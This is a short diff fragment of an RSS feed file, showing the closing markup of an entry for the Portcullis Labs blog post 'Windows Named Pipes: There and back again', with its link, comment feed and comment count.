+<p>The post <a href="https://portcullislabs.github.io/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/windows-named-pipes-there-and-back-again/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 	</channel>
